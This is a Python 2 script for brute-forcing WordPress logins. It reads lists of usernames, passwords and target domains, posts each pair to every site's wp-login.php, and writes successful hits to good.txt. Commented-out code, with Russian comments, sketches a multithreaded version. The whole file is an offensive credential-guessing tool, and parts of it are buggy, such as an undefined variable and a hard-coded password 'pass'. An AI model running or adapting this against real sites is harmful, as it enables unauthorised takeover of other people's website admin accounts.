# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from Queue import Queue

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}

#----login.txt----
file = open('login.txt' , 'r')
l_list = file.readlines()
file.close()
#----password.txt----
file = open('pwd.txt' , 'r')
p_list = file.readlines()
file.close()
#----
#----domains.txt----
file = open('domains.txt' , 'r')
d_list = file.readlines()
file.close()
#----
#domain_file = "domains.txt"

#theard_count = 5
def brut(host, login, pwd):
    url = 'http://'+host+'/wp-login.php'
    try:
        response_get = requests.get(url)
    except Exception:
        print 'Host have error'
    payload = {'log': login, 'pwd': pwd, 'wp-submit': 'Log In', 'redirect_to': 'http://'+host+'/wp-admin/', 'testcookie': '1'}
    print url
    print login+'--'+pwd
    try:
        response = requests.post(url, data=payload, headers=headers, timeout = 10)
        print x.requests.headers['Cookie']
        #print response.text
    except Exception:
        return False
        print 'Find ERROR'
    if response.text.find('action=logout')>0:
        return True
    else:
        return False
'''def brut(host):
    url = 'http://'+host+'/wp-login.php'
    #payload = {'log': login, 'pwd': pwd}
    for i in range(len(l_list)):
        for i in range(len(p_list)):
            login = l_list[i].strip()
            pwd = p_list[i].strip()
            print url
            print login+'-'+pwd
            try:
                payload = {'log': login, 'pwd': pwd}
                response = requests.post(url, data=payload, headers=headers, timeout = 10)    
            except Exception:
                return False
            else:
                if response.text.find('login_error')<0:
                    return True
                else:
                    return False'''
for i in range(len(d_list)):
    url = d_list[i].strip()
    for i in range(len(l_list)):
        login = l_list[i].strip()    
        try:
            if brut(url, login, 'pass'):
                open('good.txt', 'a+').write(url + '\n')
                print '1'
            else:
                print '0'
        except Exception:
            print 'error'
'''def run(queue, result_queue):
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        print '{} checking in thread {}'.format(host, current_thread())
        # проверяем URL
        status = check_url(host)
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status:
            print '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
            open('good.txt', 'a+').write(host + '\n')
        else:
            pass
        print '{} finished in thread {}. Result={}'.format(host, current_thread(), status)
    print '{} closing'.format(current_thread())

# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()

    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(domain_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    # И ждем, когда задачи будут выполнены    
    queue.join()

    print time.time() - start_time

if __name__ == '__main__':
    main()'''
